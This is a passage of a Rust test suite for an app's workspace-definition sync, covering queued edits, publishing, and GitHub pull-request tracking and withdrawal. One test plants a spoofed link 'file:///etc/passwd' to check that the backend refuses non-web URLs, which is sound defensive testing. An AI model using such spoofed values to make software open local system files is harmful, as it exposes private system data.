    assert_eq!(
        fx.configs.get(&fx.ws_id).unwrap().verify_pipeline,
        Some(vec![VerifyKind::Script { path: "scripts/mine.sh".into() }])
    );
}

#[test]
fn a_converted_legacy_definition_is_published_through_the_channel() {
    let fx = Fixture::new();
    fx.configs
        .set(&fx.ws_id, crate::project_config::default_atelier_config())
        .unwrap();
    let repo = FakeRepo::new();
    repo.put("main", LEGACY_PATH, PLY_LEGACY, "a", "c1");
    fx.refresh(&repo);
    assert_eq!(fx.cache().unwrap().source, DefinitionSource::Legacy);

    queue_definition(&fx.stores(), &fx.ws_id).unwrap();
    assert!(fx.queue().create_definition);
    let row = crate::doctor::shared_definition_status("Ply", &fx.cache().unwrap(), &fx.queue(), &[])
        .unwrap();
    assert_eq!(row.summary, "Pending sync");

    let publisher = FakePublisher::default();
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id)
        .unwrap()
        .unwrap();
    let requests = publisher.requests.borrow();
    let def = requests[0].2.clone().expect("the converted definition");
    assert_eq!(def.name, "Ply");
    assert_eq!(def.board, KanbanSyncMode::GitHubIssues);
    assert_eq!(
        def.verify_pipeline,
        Some(vec![VerifyKind::Script { path: "scripts/ppvp.sh".into() }])
    );
    assert!(def.integration_branch.is_none(), "the default branch is not pinned");
    assert!(fx.queue().is_empty());
    assert_eq!(fx.cache().unwrap().source, DefinitionSource::Repo);
}

#[test]
fn a_card_1_cache_with_checkout_state_loads_and_enqueues_its_pending_edits() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "a", "c1");
    fx.refresh(&repo);
    fx.workspaces.rename(&fx.ws_id, "B".into()).unwrap();
    // The cache as card 1 (GH #79) left it: checkout bookkeeping, a checkout
    // pending state, and no queue file.
    let mut raw: Value =
        serde_json::from_slice(&std::fs::read(cache_path(&fx.configs, &fx.ws_id)).unwrap())
            .unwrap();
    raw["pending"] = serde_json::json!({ "name": "B" });
    raw["pendingState"] = Value::from("writtenToCheckout");
    raw["checkoutWritten"] = Value::from("{ \"name\": \"B\" }\n");
    raw["checkoutWrittenExplicitly"] = Value::from(false);
    raw["checkoutFields"] = serde_json::json!(["name"]);
    std::fs::write(
        cache_path(&fx.configs, &fx.ws_id),
        serde_json::to_vec_pretty(&raw).unwrap(),
    )
    .unwrap();
    for state in ["checkoutOutdated", "stagedOutdated"] {
        let mut other = raw.clone();
        other["pendingState"] = Value::from(state);
        let cache: DefinitionCache = serde_json::from_value(other).unwrap();
        assert_eq!(cache.pending_state, Some(PendingState::PendingSync));
    }

    let cache = fx.cache().expect("a card-1 cache still loads");
    assert_eq!(cache.pending_state, Some(PendingState::PendingSync));
    assert_eq!(cache.pending.get("name"), Some(&Value::from("B")));
    assert!(fx.queue().is_empty());

    let publisher = FakePublisher::default();
    *publisher.branch_text.borrow_mut() = Some(PLY_DEFINITION.to_string());
    let report = publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id)
        .unwrap()
        .unwrap();
    let queued = &publisher.requests.borrow()[0].1["name"];
    assert_eq!(queued.value, Value::from("B"));
    assert_eq!(queued.base, Value::from("Ply"));
    assert_eq!(report.published, vec!["name"]);
    let saved = std::fs::read_to_string(cache_path(&fx.configs, &fx.ws_id)).unwrap();
    assert!(!saved.contains("checkoutWritten"), "the old bookkeeping is dropped");
}

#[test]
fn edits_publish_through_the_channel_and_never_through_the_checkout() {
    let module = include_str!("workspace_definition.rs");
    let body_of = |name: &str, len: usize| {
        let start = module.find(name).unwrap_or_else(|| panic!("{name} not found"));
        &module[start..(start + len).min(module.len())]
    };
    // Card 1's temporary checkout path is gone.
    for gone in [
        "write_checkout_file",
        "checkout_written",
        "fn write_checkout(",
        "git\", \"status",
    ] {
        assert!(!module.contains(gone), "{gone} is still there");
    }
    // A local edit and an editor save queue and publish on their own thread.
    assert!(body_of("pub fn edit_shared<", 1800).contains("spawn_publish(app, workspace_id)"));
    assert!(body_of("pub fn app_save<", 900).contains("spawn_publish(app, workspace_id)"));
    assert!(body_of("pub fn app_save<", 900).contains("app.emit(EDITED_EVENT"));
    assert!(body_of("pub fn app_publish_definition<", 900).contains("app.emit(EDITED_EVENT"));
    // Every refresh (Sync, the 10-minute read, open, Start build) drains the
    // queue — after reading which branch the definition names now.
    assert!(body_of("pub fn read_at_moment(", 600).contains("refresh_and_publish("));
    assert!(body_of("pub fn refresh_definition<", 1200).contains("read_at_moment("));
    let refresh = body_of("pub fn refresh_and_publish(", 1500);
    let drain = refresh.find("publish_pending").expect("drains");
    assert!(refresh.find("refresh_with(").unwrap() < drain);
    let commands = include_str!("commands.rs");
    assert!(commands.contains("pub async fn workspace_definition_publish("));
    assert!(!commands.contains("workspace_definition_write_checkout"));
    // Ship's merge takes the same lock as a publish onto that branch.
    let land = &commands[commands.find("fn land_card_local<").unwrap()..];
    let lock = land.find("shared_config::integration_lock(").unwrap();
    assert!(lock < land.find("squash_merge_into_workspace(").unwrap());
    let ship = include_str!("ship.rs");
    for f in ["pub fn ship_card<", "fn release_cards<"] {
        let body = &ship[ship.find(f).unwrap()..];
        let lock = body.find("shared_config::integration_lock(").unwrap();
        assert!(lock < body.find("squash_merge_into_workspace(").unwrap(), "{f}");
    }
}

// ── Review round 1 (snapshot 1) ───────────────────────────────────────

#[test]
fn a_creation_only_pull_request_is_tracked_until_it_settles() {
    let pr = PullRequest {
        number: 9,
        url: "https://github.com/o/r/pull/9".into(),
        branch: "atelier/config-definition-1".into(),
        head: None,
    };
    let fx = Fixture::new();
    fx.configs
        .set(&fx.ws_id, crate::project_config::default_atelier_config())
        .unwrap();
    let repo = FakeRepo::new();
    repo.put("main", LEGACY_PATH, PLY_LEGACY, "a", "c1");
    fx.refresh(&repo);
    queue_definition(&fx.stores(), &fx.ws_id).unwrap();

    let publisher = FakePublisher::default().then(PublishOutcome::PullRequest {
        conflicts: Default::default(),
        pull_request: pr.clone(),
        fields: Vec::new(),
    });
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap();
    let queue = fx.queue();
    assert_eq!(queue.create_pull_request.as_ref(), Some(&pr));
    assert!(!queue.is_empty() && queue_path_exists(&fx), "the PR is remembered");
    let cache = fx.cache().unwrap();
    assert_eq!(cache.pending_state, Some(PendingState::WaitingForPr));
    let row = crate::doctor::shared_definition_status("Ply", &cache, &queue, &[]).unwrap();
    assert_eq!(row.summary, "Waiting for PR #9 to merge");
    assert_eq!(
        waiting_pull_request_url(&queue, 9).as_deref(),
        Some("https://github.com/o/r/pull/9")
    );
    assert_eq!(waiting_pull_request_url(&queue, 10), None);

    // Publishing again doesn't open a second PR, and neither does a drain
    // while it is open.
    queue_definition(&fx.stores(), &fx.ws_id).unwrap();
    assert!(!fx.queue().create_definition);
    publisher.pr_states.borrow_mut().insert(9, PrState::Open);
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap();
    assert_eq!(publisher.requests.borrow().len(), 1);
    assert_eq!(fx.queue().create_pull_request.as_ref(), Some(&pr));
    fx.refresh(&repo);
    assert_eq!(fx.cache().unwrap().pending_state, Some(PendingState::WaitingForPr));

    // Closed without merging: settled; the file can be published again.
    publisher.pr_states.borrow_mut().insert(9, PrState::Closed);
    let report = publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id)
        .unwrap()
        .unwrap();
    assert_eq!(report.closed_pull_requests, vec![9]);
    assert!(fx.queue().is_empty() && !queue_path_exists(&fx));
    assert_eq!(fx.cache().unwrap().pending_state, None);
    queue_definition(&fx.stores(), &fx.ws_id).unwrap();
    assert!(fx.queue().create_definition);

    // A merged one settles too.
    let publisher = FakePublisher::default().then(PublishOutcome::PullRequest {
        conflicts: Default::default(),
        pull_request: pr.clone(),
        fields: Vec::new(),
    });
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap();
    publisher.pr_states.borrow_mut().insert(9, PrState::Merged);
    let report = publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id)
        .unwrap()
        .unwrap();
    assert!(report.closed_pull_requests.is_empty());
    assert!(fx.queue().is_empty());
}

#[test]
fn the_pull_request_link_opens_through_the_backend() {
    // Card #94: the link lives on the publish bar of Settings › Repository.
    let page = include_str!("../../src/components/RepositoryPage.tsx");
    assert!(!page.contains("target=\"_blank\""), "the webview opens no new windows");
    assert!(page.contains("workspaceDefinitionOpenPullRequest("));
    let commands = include_str!("commands.rs");
    let start = commands
        // Review 1 (MINOR): on the blocking pool, because finding the library
        // queue asks git which branch this workspace publishes to.
        .find("pub async fn workspace_definition_open_pull_request(")
        .unwrap();
    let body = &commands[start..start + 1600];
    assert!(body.contains("spawn_blocking("), "{body}");
    assert!(body.contains("waiting_pull_request_url(") && body.contains("platform::open_url("));
    // GH #160: the library queue is asked too — the Library's rows and the toast
    // that announces the outcome offer `Open pull request` for a note, a skill or
    // the instructions, and none of those is in the definition queue.
    assert!(body.contains("waiting_library_pull_request_url("), "{body}");
    assert!(include_str!("lib.rs").contains("commands::workspace_definition_open_pull_request,"));
}

/// GH #160: a pull request one of the **library** queue's changes waits in can be
/// opened, and nothing else can.
#[test]
fn a_library_changes_pull_request_is_one_the_backend_will_open() {
    use crate::shared_library_sync::{LibraryChange, LibraryFile, LibraryQueue};
    let mut change = LibraryChange::instructions(
        "both CLIs read AGENTS.md",
        vec![LibraryFile::new("AGENTS.md".into(), b"# Shared\n", false)],
        Default::default(),
    )
    .unwrap();
    change.pull_request = Some(PullRequest {
        number: 375,
        url: "https://github.com/o/r/pull/375".into(),
        branch: "atelier/instructions-agents-md-1-abcd1234".into(),
        head: None,
    });
    let mut queue = LibraryQueue::default();
    queue.changes.push(change.clone());
    assert_eq!(
        waiting_library_pull_request_url(&queue, 375).as_deref(),
        Some("https://github.com/o/r/pull/375"),
    );
    // Only a pull request this queue is really waiting in.
    assert_eq!(waiting_library_pull_request_url(&queue, 376), None);
    assert_eq!(waiting_library_pull_request_url(&LibraryQueue::default(), 375), None);
    // And never a URL that is not a link.
    let mut spoofed = LibraryQueue::default();
    let mut change = change;
    change.pull_request = Some(PullRequest {
        number: 375,
        url: "file:///etc/passwd".into(),
        branch: "atelier/x".into(),
        head: None,
    });
    spoofed.changes.push(change);
    assert_eq!(waiting_library_pull_request_url(&spoofed, 375), None);
}

// ── Review round 2 (snapshot 2) ───────────────────────────────────────

#[test]
fn the_fallback_branch_is_saved_before_the_attempt_and_kept_until_it_settles() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "a", "c1");
    fx.refresh(&repo);
    set_pipeline(&fx, "scripts/mine.sh");
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap();

    let publisher = FakePublisher::default()
        .then(PublishOutcome::Failed("gh pr create timed out".into()))
        .then(PublishOutcome::PullRequest {
            conflicts: Default::default(),
            pull_request: PullRequest {
                number: 5,
                url: "https://github.com/o/r/pull/5".into(),
                branch: "x".into(),
                head: None,
            },
            fields: vec!["verifyPipeline".into()],
        });
    *publisher.queue_file.borrow_mut() =
        Some(crate::shared_config::queue_path(&fx.configs, &fx.ws_id));
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap();
    let branch = fx.queue().pull_request_branch.expect("kept after a failure");
    assert!(branch.starts_with("atelier/config-verify-pipeline-"), "{branch}");
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap();
    let seen = publisher.pr_branches.borrow().clone();
    assert_eq!(
        seen,
        vec![
            (branch.clone(), Some(branch.clone())),
            (branch.clone(), Some(branch.clone())),
        ],
        "the same branch, on disk before each attempt"
    );
    assert_eq!(fx.queue().pull_request_branch, None, "settled by the PR");
}

/// A write channel onto the fake repository itself: the branch really
/// changes, so the refresh after a publish reads it.
struct RepoPublisher<'a>(&'a FakeRepo);

impl Publisher for RepoPublisher<'_> {
    fn publish(&self, request: &PublishRequest<'_>) -> PublishOutcome {
        let base = self
            .0
            .read(request.branch, DEFINITION_PATH)
            .map(|f| parse_definition(&f.bytes).unwrap())
            .unwrap();
        let fields = request
            .fields
            .iter()
            .map(|(k, f)| (k.clone(), f.value.clone()))
            .collect();
        let text = file_text(&base, None, &fields, request.default_branch);
        self.0.put(request.branch, DEFINITION_PATH, &text, "me", "published");
        PublishOutcome::Published {
            conflicts: Default::default(),
            commit: "published".into(),
            definition: parse_definition(text.as_bytes()).unwrap(),
            author: Some("me".into()),
            fields: request.fields.keys().cloned().collect(),
            overrides: Vec::new(),
            pushed: true,
        }
    }
    fn pull_request_state(&self, _: &PullRequest) -> Option<PrState> {
        None
    }
    fn close_pull_request(&self, _: &PullRequest) -> Result<(), String> {
        Ok(())
    }
    fn withdraw_branch(&self, _: &str) -> Result<Vec<u64>, String> {
        Ok(Vec::new())
    }
}

#[test]
fn a_queued_edit_is_published_to_the_branch_the_definition_names_now() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "a", "c1");
    fx.refresh(&repo);
    assert_eq!(fx.cache().unwrap().branch.as_deref(), Some("main"));
    fx.workspaces.rename(&fx.ws_id, "Renamed".into()).unwrap();
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap();

    // Offline meanwhile, someone moves the definition to staging.
    let on_staging = PLY_DEFINITION.replace(
        "\"schemaVersion\": 1,",
        "\"schemaVersion\": 1, \"integrationBranch\": \"staging\",",
    );
    repo.put("main", DEFINITION_PATH, &on_staging, "b", "c2");
    repo.put("staging", DEFINITION_PATH, &on_staging, "b", "c3");

    let publisher = RepoPublisher(&repo);
    let report =
        refresh_and_publish(&fx.stores(), &repo, &publisher, &fx.ws_id, RefreshMoment::Sync)
            .unwrap();
    let publish = report.publish.clone().unwrap();
    assert_eq!(publish.branch, "staging");
    assert_eq!(publish.published, vec!["name"]);
    assert_eq!(
        parse_definition(&repo.read("staging", DEFINITION_PATH).unwrap().bytes)
            .unwrap()
            .name,
        "Renamed"
    );
    // The edit survived: on this Mac, in the cache, in the report.
    assert_eq!(fx.ws().name, "Renamed");
    assert_eq!(report.branch.as_deref(), Some("staging"));
    assert!(report.pending_fields.is_empty());
    assert!(!report.changes.iter().any(|c| c.field == "name"), "{:?}", report.changes);
    assert!(report.changes.iter().any(|c| c.field == "integrationBranch"));
    assert!(fx.queue().is_empty());
    // Nothing queued: a plain refresh, no publish.
    let report =
        refresh_and_publish(&fx.stores(), &repo, &publisher, &fx.ws_id, RefreshMoment::Periodic)
            .unwrap();
    assert!(report.publish.is_none() && report.changes.is_empty());
}

// ── Review round 4 (snapshot 4) ───────────────────────────────────────

fn pr7() -> PullRequest {
    PullRequest {
        number: 7,
        url: "https://github.com/o/r/pull/7".into(),
        branch: "atelier/config-accent-color-1".into(),
        head: None,
    }
}

/// A workspace whose accent colour and name wait together in PR #7.
fn two_fields_in_a_pr() -> (Fixture, FakeRepo) {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "a", "c1");
    fx.refresh(&repo);
    fx.workspaces
        .set_accent_color(&fx.ws_id, Some("#000000".into()))
        .unwrap();
    fx.workspaces.rename(&fx.ws_id, "Mine".into()).unwrap();
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap();
    let publisher = FakePublisher::default().then(PublishOutcome::PullRequest {
        conflicts: Default::default(),
        pull_request: pr7(),
        fields: vec!["accentColor".into(), "name".into()],
    });
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap();
    assert_eq!(fx.cache().unwrap().pending_state, Some(PendingState::WaitingForPr));
    (fx, repo)
}

#[test]
fn editing_one_field_of_a_pr_republishes_every_field_it_carries() {
    let (fx, repo) = two_fields_in_a_pr();
    fx.workspaces.rename(&fx.ws_id, "Mine again".into()).unwrap();
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap();
    let queue = fx.queue();
    // Only the edited field leaves the PR until its state is known.
    assert_eq!(queue.fields["name"].pull_request, None);
    assert_eq!(queue.fields["accentColor"].pull_request, Some(pr7()));
    assert_eq!(queue.superseded_pull_requests, vec![pr7()]);

    // Still open, still refused: the replacement goes into the same PR, with
    // both fields.
    let publisher = FakePublisher::default().then(PublishOutcome::PullRequest {
        conflicts: Default::default(),
        pull_request: pr7(),
        fields: vec!["accentColor".into(), "name".into()],
    });
    publisher.pr_states.borrow_mut().insert(7, PrState::Open);
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap();
    let (_, fields, _) = publisher.requests.borrow()[0].clone();
    assert_eq!(fields.keys().collect::<Vec<_>>(), vec!["accentColor", "name"]);
    assert_eq!(fields["name"].value, Value::from("Mine again"));
    assert_eq!(fields["accentColor"].value, Value::from("#000000"));
    // Round 3 (S4): on a branch of its own — that PR's branch is never
    // forced, and its name no longer seeds the next one's (`…-2-2`). The
    // publisher is told which pull request this replaces.
    let asked = publisher.pr_branches.borrow()[0].0.clone();
    assert!(asked != pr7().branch && asked.starts_with("atelier/config-"), "{asked}");
    assert_eq!(*publisher.replaced.borrow(), vec![vec![7]]);
    // (This fake answers with the same pull request, which is then kept.)
    assert!(publisher.closed.borrow().is_empty());
    let queue = fx.queue();
    assert!(queue.superseded_pull_requests.is_empty());
    assert!(queue.fields.values().all(|f| f.pull_request == Some(pr7())));

    // Merged: both edits are settled, neither is lost on the way.
    publisher.pr_states.borrow_mut().insert(7, PrState::Merged);
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap();
    assert!(fx.queue().is_empty());

    // Had the push gone through directly instead, the PR is withdrawn.
    let (fx, repo) = two_fields_in_a_pr();
    fx.workspaces.rename(&fx.ws_id, "Direct".into()).unwrap();
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap();
    let publisher = FakePublisher::default();
    publisher.pr_states.borrow_mut().insert(7, PrState::Open);
    *publisher.branch_text.borrow_mut() = Some(PLY_DEFINITION.to_string());
    let report = publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id)
        .unwrap()
        .unwrap();
    assert_eq!(report.published, vec!["accentColor", "name"]);
    assert_eq!(report.withdrawn_pull_requests, vec![7]);
    assert_eq!(*publisher.closed.borrow(), vec![7]);
    assert!(fx.queue().is_empty());
}

#[test]
fn reverting_what_a_pr_proposes_withdraws_or_rebuilds_it() {
    // One of two fields reverted: the PR is rebuilt with the other only.
    let (fx, repo) = two_fields_in_a_pr();
    fx.workspaces
        .set_accent_color(&fx.ws_id, Some("#7c3aed".into()))
        .unwrap();
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap();
    let publisher = FakePublisher::default().then(PublishOutcome::PullRequest {
        conflicts: Default::default(),
        pull_request: pr7(),
        fields: vec!["name".into()],
    });
    publisher.pr_states.borrow_mut().insert(7, PrState::Open);
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap();
    let (_, fields, _) = publisher.requests.borrow()[0].clone();
    assert_eq!(fields.keys().collect::<Vec<_>>(), vec!["name"]);
    assert_ne!(publisher.pr_branches.borrow()[0].0, pr7().branch, "a branch of its own (S4)");
    assert!(fx.queue().superseded_pull_requests.is_empty());

    // Everything reverted: nothing to publish, the PR is closed — and if
    // closing fails it stays listed and is retried.
    fx.workspaces.rename(&fx.ws_id, "Ply".into()).unwrap();
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap();
    assert!(fx.cache().unwrap().pending.is_empty());
    assert!(!fx.queue().is_empty(), "the PR to withdraw is remembered");
    assert!(queue_path_exists(&fx));
    let publisher = FakePublisher::default();
    publisher.close_fails.set(true);
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap();
    assert!(publisher.requests.borrow().is_empty());
    assert_eq!(fx.queue().superseded_pull_requests, vec![pr7()]);
    publisher.close_fails.set(false);
    let report = publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id)
        .unwrap()
        .unwrap();
    assert_eq!(report.withdrawn_pull_requests, vec![7]);
    assert!(fx.queue().is_empty() && !queue_path_exists(&fx));
    assert_eq!(fx.cache().unwrap().pending_state, None);
}

// ── Review round 5 (snapshot 5) ───────────────────────────────────────

#[test]
fn fallback_branches_are_unique_per_queued_change() {
    let names: Vec<String> = (0..2)
        .map(|_| {
            let fx = Fixture::new();
            let repo = FakeRepo::new();
            repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "a", "c1");
            fx.refresh(&repo);
            fx.workspaces.rename(&fx.ws_id, "Same second".into()).unwrap();
            record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap();
            let publisher =
                FakePublisher::default().then(PublishOutcome::Unreachable("offline".into()));
            publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap();
            fx.queue().pull_request_branch.unwrap()
        })
        .collect();
    assert_ne!(names[0], names[1], "two Macs, same field, same second");
    for name in &names {
        let rest = name.strip_prefix("atelier/config-name-").unwrap();
        let (secs, id) = rest.split_once('-').unwrap();
        assert!(secs.parse::<i64>().is_ok() && id.len() == 8, "{name}");
    }
}

#[test]
fn reverting_after_an_unanswered_attempt_withdraws_what_it_may_have_opened() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "a", "c1");
    fx.refresh(&repo);
    fx.workspaces.rename(&fx.ws_id, "Mine".into()).unwrap();
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap();
    let publisher = FakePublisher::default()
        .then(PublishOutcome::Failed("gh pr create: context deadline exceeded".into()));
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap();
    let branch = fx.queue().pull_request_branch.unwrap();

    // Reverted before the retry: nothing pending, but the attempt is kept…
    fx.workspaces.rename(&fx.ws_id, "Ply".into()).unwrap();
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap();
    assert!(fx.cache().unwrap().pending.is_empty());
    assert!(!fx.queue().is_empty() && queue_path_exists(&fx));
    // …until a drain has withdrawn whatever it opened.
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap();
    assert_eq!(*publisher.withdrawn_branches.borrow(), vec![branch]);
    assert_eq!(publisher.requests.borrow().len(), 1, "nothing republished");
    assert!(fx.queue().is_empty() && !queue_path_exists(&fx));
}

#[test]
fn an_edit_while_the_creation_waits_in_a_pr_replaces_that_pr() {
    let pr = PullRequest {
        number: 9,
        url: "https://github.com/o/r/pull/9".into(),
        branch: "atelier/config-definition-1-abcdef12".into(),
        head: None,
    };
    let fx = Fixture::new();
    fx.configs
        .set(&fx.ws_id, crate::project_config::default_atelier_config())
        .unwrap();
    let repo = FakeRepo::new();
    repo.put("main", LEGACY_PATH, PLY_LEGACY, "a", "c1");
    fx.refresh(&repo);
    queue_definition(&fx.stores(), &fx.ws_id).unwrap();
    let publisher = FakePublisher::default().then(PublishOutcome::PullRequest {
        conflicts: Default::default(),
        pull_request: pr.clone(),
        fields: Vec::new(),
    });
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap();
    assert_eq!(fx.queue().create_pull_request.as_ref(), Some(&pr));

    fx.workspaces.rename(&fx.ws_id, "Renamed".into()).unwrap();
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap();
    let queue = fx.queue();
    assert!(queue.create_definition && queue.create_pull_request.is_none());
    assert_eq!(queue.pull_request_branch, None, "a name of its own at the next publish (S4)");
    assert_eq!(queue.superseded_pull_requests, vec![pr.clone()]);

    let publisher = FakePublisher::default().then(PublishOutcome::PullRequest {
        conflicts: Default::default(),
        pull_request: pr.clone(),
        fields: vec!["name".into()],
    });
    publisher.pr_states.borrow_mut().insert(9, PrState::Open);
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap();
    let (_, fields, create_from) = publisher.requests.borrow()[0].clone();
    assert!(create_from.is_some(), "still creates the file");
    assert_eq!(fields.keys().collect::<Vec<_>>(), vec!["name"]);
    assert_ne!(publisher.pr_branches.borrow()[0].0, pr.branch, "never the creation PR's branch again");
    assert_eq!(*publisher.replaced.borrow(), vec![vec![9]], "its pull request says it replaces #9");
    // (This fake answers with the same pull request, which is then kept.)
    assert!(publisher.closed.borrow().is_empty());
    let queue = fx.queue();
    assert_eq!(queue.create_pull_request.as_ref(), Some(&pr));
    assert_eq!(queue.fields["name"].pull_request.as_ref(), Some(&pr));
    assert!(queue.superseded_pull_requests.is_empty());
    assert_eq!(fx.cache().unwrap().pending_state, Some(PendingState::WaitingForPr));
}

#[test]
fn landing_a_card_syncs_first_and_ship_commands_run_on_workers() {
    let commands = include_str!("commands.rs");
    let land = &commands[commands.find("fn land_card_local<").unwrap()..];
    let lock = land.find("shared_config::integration_lock(").unwrap();
    let sync = land.find("land_sync_gate(&fast_forward, &ws_cwd, &target_branch)?;").unwrap();
    let merge = land.find("squash_merge_into_workspace(").unwrap();
    assert!(lock < sync && sync < merge);
    // After the wait and the fetch: unsafe outcomes stop it, and the checkout
    // is checked clean again right before the merge (its rollback resets).
    let after_sync = &land[sync..merge];
    assert!(after_sync.contains("require_clean_target(&ws_cwd)?"));
    // GH #151: the gate is its own function, so fixture repos can drive it.
    let gate = &commands[commands.find("fn land_sync_gate(").unwrap()..];
    let gate = &gate[..gate.find("\n}\n").unwrap()];
    assert!(gate.contains("worktrees::fast_forward_local_locked(held, "));
    assert!(gate.contains("Sync::Dirty") && gate.contains("Sync::Failed"));
    assert!(gate.contains("Sync::UntrackedDiffers"));
    for (command, worker) in [
        ("pub async fn card_ship(", "card_ship_blocking("),
        ("pub async fn card_review_merge(", "card_review_merge_blocking("),
    ] {
        let start = commands.find(command).unwrap_or_else(|| panic!("{command}"));
        let body = &commands[start..start + 700];
        assert!(body.contains("spawn_blocking") && body.contains(worker), "{command}");
    }
}

// ── Review round 6 (snapshot 6) ───────────────────────────────────────

#[test]
fn a_merged_pr_is_settled_before_a_newer_remote_edit_can_unpair_its_fields() {
    let (fx, repo) = two_fields_in_a_pr();
    // PR #7 merges (accent #000000, name Mine), then someone renames again.
    repo.put(
        "main",
        DEFINITION_PATH,
        &PLY_DEFINITION
            .replace("#7c3aed", "#000000")
            .replace("\"Ply\"", "\"Theirs\""),
        "other",
        "c9",
    );
    let publisher = FakePublisher::default();
    publisher.pr_states.borrow_mut().insert(7, PrState::Merged);
    let report =
        refresh_and_publish(&fx.stores(), &repo, &publisher, &fx.ws_id, RefreshMoment::Sync)
            .unwrap();
    assert!(publisher.requests.borrow().is_empty(), "nothing stale republished");
    assert!(publisher.closed.borrow().is_empty());
    assert!(fx.queue().is_empty());
    assert_eq!(fx.ws().name, "Theirs", "the newer remote edit wins");
    assert_eq!(fx.ws().accent_color.as_deref(), Some("#000000"));
    assert!(report.pending_fields.is_empty());
}

#[test]
fn a_publish_goes_to_the_named_integration_branch_even_before_it_has_the_file() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    let names_staging = PLY_DEFINITION.replace(
        "\"schemaVersion\": 1,",
        "\"schemaVersion\": 1, \"integrationBranch\": \"staging\",",
    );
    repo.put("main", DEFINITION_PATH, &names_staging, "a", "c1");
    repo.branches.borrow_mut().insert("staging".into());
    fx.refresh(&repo);
    assert_eq!(fx.cache().unwrap().branch.as_deref(), Some("main"), "read from main");
    fx.workspaces.rename(&fx.ws_id, "Renamed".into()).unwrap();
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap();

    let publisher = FakePublisher::default();
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap();
    let (branch, _, create_from) = publisher.requests.borrow()[0].clone();
    assert_eq!(branch, "staging");
    assert!(create_from.is_some(), "created there from the copy read");
    assert_eq!(fx.cache().unwrap().branch.as_deref(), Some("staging"));

    // A named branch that doesn't exist: where the copy was read.
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, &names_staging, "a", "c1");
    fx.refresh(&repo);
    fx.workspaces.rename(&fx.ws_id, "Renamed".into()).unwrap();
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap();
    let publisher = FakePublisher::default();
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap();
    assert_eq!(publisher.requests.borrow()[0].0, "main");
}

// ── Review round 7 (snapshot 7) ───────────────────────────────────────

#[test]
fn an_edit_before_a_merged_pr_is_settled_republishes_only_the_edit() {
    // PR #7 (accent #000000, name Mine) merged; then someone sets the accent
    // to #111111 on the branch; this Mac, not refreshed yet, renames.
    let (fx, repo) = two_fields_in_a_pr();
    repo.put(
        "main",
        DEFINITION_PATH,
        &PLY_DEFINITION
            .replace("#7c3aed", "#111111")
            .replace("\"Ply\"", "\"Mine\""),
        "other",
        "c9",
    );
    fx.workspaces.rename(&fx.ws_id, "Mine, renamed".into()).unwrap();
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap();

    let publisher = FakePublisher::default();
    publisher.pr_states.borrow_mut().insert(7, PrState::Merged);
    *publisher.branch_text.borrow_mut() = Some(
        PLY_DEFINITION
            .replace("#7c3aed", "#111111")
            .replace("\"Ply\"", "\"Mine\""),
    );
    let report = publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id)
        .unwrap()
        .unwrap();
    let (_, fields, _) = publisher.requests.borrow()[0].clone();
    assert_eq!(fields.keys().collect::<Vec<_>>(), vec!["name"], "the old accent stays settled");
    assert_eq!(report.published, vec!["name"]);
    assert!(publisher.closed.borrow().is_empty(), "a merged PR isn't closed");
    assert!(fx.queue().is_empty());

    // The refresh after it keeps the newer remote accent.
    repo.put(
        "main",
        DEFINITION_PATH,
        &PLY_DEFINITION
            .replace("#7c3aed", "#111111")
            .replace("\"Ply\"", "\"Mine, renamed\""),
        "me",
        "pushed1",
    );
